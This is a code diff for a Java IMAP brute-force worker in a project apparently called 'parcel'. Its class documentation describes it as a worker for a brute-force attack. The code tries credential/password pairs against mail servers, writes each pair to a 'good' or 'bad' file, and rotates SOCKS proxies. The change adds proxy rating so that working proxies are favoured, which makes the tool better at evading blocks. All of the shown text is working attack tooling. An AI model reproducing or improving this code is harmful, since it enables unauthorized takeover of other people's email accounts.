@@ -8,6 +8,7 @@ import org.bsoftware.parcel.domain.components.DataContainer;
 import org.bsoftware.parcel.domain.model.Connection;
 import org.bsoftware.parcel.domain.model.LogLevel;
 import org.bsoftware.parcel.domain.model.Proxy;
+import org.bsoftware.parcel.domain.model.ProxyRatingAdjustmentType;
 import org.bsoftware.parcel.domain.model.Source;
 import org.bsoftware.parcel.utilities.ConnectionUtility;
 import org.bsoftware.parcel.utilities.FileSystemUtility;
@@ -18,7 +19,7 @@ import java.io.IOException;
  * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
  *
  * @author Rudolf Barbu
- * @version 1.0.6
+ * @version 1.0.7
  */
 @RequiredArgsConstructor
 public class BruteForceRunnable implements Runnable
@@ -62,14 +63,11 @@ public class BruteForceRunnable implements Runnable
                 ckImap.put_StartTls(connection.isTls());
 
                 connectToServer(ckImap, connection.getHost());
-                FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
 
-                if (!Thread.currentThread().isInterrupted())
+                if (!ckImap.connectedToHost().isEmpty())
                 {
+                    FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? "good" : "bad", source);
                     bruteForceCallback.handleDecrementSourcesCounter();
-                }
-                else if (!ckImap.connectedToHost().isEmpty())
-                {
                     ckImap.Disconnect();
                 }
             }
@@ -90,21 +88,34 @@ public class BruteForceRunnable implements Runnable
      */
     private void connectToServer(final CkImap ckImap, final String host)
     {
-        if (!ckImap.socksHostname().isEmpty() && ckImap.Connect(host))
+        final String ipAddress = ckImap.socksHostname();
+        final int port = ckImap.get_SocksPort();
+
+        if (!ipAddress.isEmpty() && (port != 0))
         {
-            return;
+            if (!Thread.currentThread().isInterrupted() && ckImap.Connect(host))
+            {
+                DataContainer.adjustProxyRating(new Proxy(ipAddress, port), ProxyRatingAdjustmentType.INCREASE);
+                return;
+            }
+
+            DataContainer.adjustProxyRating(new Proxy(ipAddress, port), ProxyRatingAdjustmentType.DECREASE);
         }
 
-        Proxy proxy;
-        while (((proxy = DataContainer.getRandomProxy()) != null) && !Thread.currentThread().isInterrupted())
+        while (!Thread.currentThread().isInterrupted())
         {
+            final Proxy proxy = DataContainer.getConvectionProxy();
+
             ckImap.put_SocksHostname(proxy.getIpAddress());
             ckImap.put_SocksPort(proxy.getPort());
 
             if (ckImap.Connect(host))
             {
+                DataContainer.adjustProxyRating(proxy, ProxyRatingAdjustmentType.INCREASE);
                 return;
             }
+
+            DataContainer.adjustProxyRating(proxy, ProxyRatingAdjustmentType.DECREASE);
         }
     }
 }
